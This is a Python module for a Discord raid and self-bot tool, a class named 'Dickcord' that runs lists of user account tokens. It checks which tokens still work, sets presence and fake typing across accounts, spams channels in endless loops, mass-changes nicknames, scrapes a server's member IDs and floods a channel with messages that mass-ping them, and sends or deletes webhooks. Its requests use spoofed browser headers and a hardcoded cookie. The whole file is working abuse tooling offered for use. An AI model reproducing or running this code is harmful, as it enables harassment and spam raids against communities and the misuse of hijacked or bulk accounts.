from .imports import *
from .Style import *

"""
Copyright 2023 KADIUM
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

class Dickcord:
    @staticmethod
    def checktokens(filename):
        os.system('cls')
        def check_token(token, valid_tokens, invalid_tokens, locked_tokens):
            headers={"authorization": token,"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "de-DE"}
            try:
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers=headers)
                if response.status_code == 200:
                    with lock:
                        valid_tokens.append(token)
                    Style.print(f"(+): WORKING {token}")
                elif response.status_code == 401 or response.status_code == 403:
                    with lock:
                        locked_tokens.append(token)
                    Style.print(f"(/): LOCKED {token}")
                elif response.status_code == 404:
                    with lock:
                        invalid_tokens.append(token)
                    Style.print(f"(-): INVALID {token}")
                else:
                    Style.print(f"(-): ERROR {token}")
            except:
                with lock:
                    locked_tokens.append(token)
                Style.print(f"(/): LOCKED {token}")
            sleep(1)
        with open(filename, 'r') as f:
            tokens = [line.strip() for line in f.readlines()]
        valid_tokens = []
        invalid_tokens = []
        locked_tokens = []
        lock = threading.Lock()
        threads = []
        for token in tokens:
            t = threading.Thread(target=check_token, args=(token, valid_tokens, invalid_tokens, locked_tokens))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        print("\n")
        input(f"        {Fore.LIGHTGREEN_EX}Valid: {len(valid_tokens)}{Fore.RESET}    |   {Fore.LIGHTRED_EX}Invalid: {len(invalid_tokens)}{Fore.RESET}   |   {Fore.YELLOW}Locked: {len(locked_tokens)}{Fore.RESET} "+ "\n" * 3)
        with open(filename, 'w') as f:  
            for token in valid_tokens: 
                f.write(token + "\n")

    @staticmethod
    def settokenactivity(filename):
        def activity(token, act1):
            ws = websocket.WebSocket()
            actt = 'Idle'
            ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
            gjs = {'name': act1,
                   'type': 0}
            auth = {'op': 2,
                    'd': {'token': token,
                          'properties': {'$os': sys.platform,
                                         '$browser': 'RTB',
                                         '$device': f"{sys.platform} Device"},
                          'presence': {'game': gjs,
                                       'status': actt,
                                       'since': 0,
                                       'afk': False}},
                    's': None,
                    't': None}
            ws.send(json.dumps(auth))
            Style.print(f'(+): Playing {act1} on {token}!')    
        tokens = open(filename, 'r').read().splitlines()
        text = Style.input(f"(>): Playing Status?: ")
        for token in tokens:
            threading.Thread(target=activity, args=(token, text)).start()
        sleep(3)
        Style.input("(#): Press ENTER to go Back.")
    
    @staticmethod
    def faketyping(filename):
        CHANNELID = Style.input(f"(>): Channel ID?: ")

        with open(filename) as f:
            tokens = f.read().splitlines()

        while True:
            for token in tokens:
                headers = {'Authorization': f'{token}',
                           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                           'Origin': 'discord.com',
                           'Accept': '*/*',
                           'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                           'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
                response = requests.post(f'https://discord.com/api/v9/channels/{CHANNELID}/typing', headers=headers)
                if response.status_code == 204:
                    Style.print(f"(+): Started Typing on {token}")
                else:
                    Style.print(f"(-): Error Typing on {token}")
    @staticmethod
    def spamchannel(filename):
        os.system('cls')
        channel7 = Style.input(f"(#): Channel ID?: ")
        mess7 = Style.input(f"(#): Message to Spam?: ")
        tokens = open(filename, "r").read().splitlines()
        def spam(token, channel7, mess7):
            url = 'https://discord.com/api/v9/channels/'+channel7+'/messages'
            data = {"content": mess7}
            header = {"authorization": token}
            while True:
                r = requests.post(url, data=data, headers=header)
                if r.status_code == 200:
                    Style.print(f"(+): SENT {token[:31]}****")
                else:
                    Style.print(f"(-): FAILED {token[:31]}****")
        for token in tokens:
            while True:
                threads = []
                for token in tokens:
                    thread = threading.Thread(target=spam, args=(token,channel7,mess7))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
    @staticmethod
    def nicknamechanger(filename):
        os.system('cls')
        def changenick(server, nickname, token):
                headers = {'authorization': token,
                           'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58',
                           'origin': 'discord.com',
                           'accept': '*/*',
                           'accept-encoding': 'gzip, deflate, br',
                           'cookie': 'OptanonAlertBoxClosed=2023-01-26T20:36:52.227Z; __stripe_mid=bbd8f44b-7488-4008-8e40-0a72bbe8c21807184f; __dcfduid=e14f9eb4d31311eda6efba5f5200c940; __sdcfduid=e14f9eb4d31311eda6efba5f5200c94085aa488f68b9451f18efb0701e9060b5b9ea1796ada5e79ecbeca1c4e4e244fc; _ga=GA1.1.835861043.1674765413; _gcl_au=1.1.1887000733.1682606129; __cfruid=1c3e7476fe88cc0e95e38eb018e6205fbea93a8e-1682755053; OptanonConsent=isIABGlobal=false&datestamp=Sat+Apr+29+2023+09%3A57%3A32+GMT%2B0200+(Mitteleurop%C3%A4ische+Sommerzeit)&version=6.33.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1&geolocation=DE%3BNW&AwaitingReconsent=false; locale=de; _ga_Q149DFWHT7=GS1.1.1682755053.165.0.1682755053.0.0.0',
                           'sec-ch-ua': '"Chromium";v="112", "Microsoft Edge";v="112", "Not:A-Brand";v="99"',
                           'x-discord-locale': 'de',
                           'sec-ch-ua-platform': 'Windows',
                           'x-debug-options': 'bugReporterEnabled',
                           'sec-fetch-mode': 'cors',
                           'sec-fetch-site': 'same-origin',
                           'sec-ch-ua-mobile': '?0',
                           'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTIuMC4xNzIyLjU4IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ=='}

                r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                                   json={"nick": nickname})
                if r.status_code == 200:
                    Style.print(f"(+): CHANGED {token[:31]}****")
                if r.status_code != 200:
                    Style.print(f"(/): FAILED {token[:31]}****")
        tokens = open(filename, 'r').read().splitlines()
        server = Style.input(f"(>): Server ID?: ")
        nick = Style.input(f"(>): Nickname?: ")
        for token in tokens:
            threading.Thread(target=changenick, args=(server, nick, token)).start()
        sleep(1)
        Style.input(f"(#): Finished, Press ENTER.")

    @staticmethod
    def advancedspam(filename):
        token = Style.input(f"(#): Token To Scrape MemberID's?: ")
        b = Fore.BLUE
        os.system('pip install discum==1.1.0')
        import discum
        os.system('cls')
        guildid = Style.input(f'(#): Server ID?: ')
        channelid = Style.input(f'(#): Channel ID?: ')
        MEMBERFILE = Style.input(f'(#): File to Store the MemberIDs at?: ')
        bot = discum.Client(token=token)

        def close_after_fetching(resp, guild_id):
            if bot.gateway.finishedMemberFetching(guild_id):
                lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                print(str(lenmembersfetched) + ' members fetched')
                bot.gateway.removeCommand({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.close()

        def get_members(guild_id, channelidlol):
            bot.gateway.fetchMembers(guild_id, channelidlol, keep='all', wait=1)
            bot.gateway.command({'function': close_after_fetching, 'params': {'guild_id': guild_id}})
            bot.gateway.run()
            bot.gateway.resetSession()
            return bot.gateway.session.guild(guild_id).members

        members = get_members(guildid, channelid)
        memberslist = []

        for memberID in members:
            memberslist.append(memberID)
            print(memberID)

        os.system('cls')

        with open(MEMBERFILE,'w') as ids:
            for element in memberslist:
                ids.write(element + '\n')   
        with open(MEMBERFILE) as f:
            member_ids = f.read().splitlines()
        with open(filename) as f:
            tokens = f.read().splitlines()

        CHANNEL_ID = Style.input(f"(#): Channel ID to spam?: ")
        MESSAGE = Style.input(f"(#): Message?: ")
        PING = Style.input(f"(#): Amout to Ping?: ")
        RING = Style.input(f"(#): Amout of Emojis?: ")
        url = f'https://discord.com/api/v9/channels/{CHANNEL_ID}/messages'

        messages = [MESSAGE, MESSAGE]

        def send_message(token):
            headers = {'Authorization': f'{token}',
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                       'Origin': 'discord.com',
                       'Accept': '*/*',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                       'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'}
            for message in messages:
                emojilist = ['😀', '😁', '😂', '🤣', '😃', '😄', '😅', '😆', '😇', '😉', '😊', '🙂', '🙃', '😋', '😌', '😍', '🥰', '😘', '😗', '😙', '😚', '😜', '😝', '😛', '🤑', '🤗', '🤔', '🤭', '🤫', '🤥', '😏', '😒', '😞', '😔', '😟', '😕', '🙁', '☹️', '😣', '😖', '😫', '😩', '🥺', '😢', '😭', '😤', '😠', '😡', '🤬', '🤯', '😳', '🥵', '🥶', '😱', '😨', '😰', '😥', '😓', '🤗', '🙄', '😶', '😐', '😑', '😬', '🤨', '😔', '😕', '🙃', '🤢', '🤮', '🤧', '😷', '🥴', '😴', '💤', '💩', '👻', '💀', '☠️', '👽', '👾', '🤖', '🎃', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾']
                ezem = random.sample(emojilist, int(RING))
                emmen = " ".join([f"{em}" for em in ezem])
                member_ids_selected = random.sample(member_ids, int(PING))
                members_mentioned = " ".join([f"<@{id}>" for id in member_ids_selected])
                message_with_member_id = f'{members_mentioned} ```{message}``` {emmen}'

                data = {'content': message_with_member_id}
                response = requests.post(url, headers=headers, json=data)
                print(response.text)

        while True:
            threads = []
            for token in tokens:
                thread = threading.Thread(target=send_message, args=(token,))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

    @staticmethod
    def webhook(url, option="send", avatar=None, username=None, message=None):
        if option == "send":
            data = {
                "content": message,
                "username": username,
                "avatar_url": avatar
            }
            response = requests.post(url, json=data)
            if response.status_code == 204:
                Style.print("(+): Message was sent")
            else:
                Style.print(f"(!): Couln't Delete Webhook ({response.status_code})")
        if option == "delete":
            requests.delete(url)
            Style.print("(+): Deleted Webhook")
        else:
            pass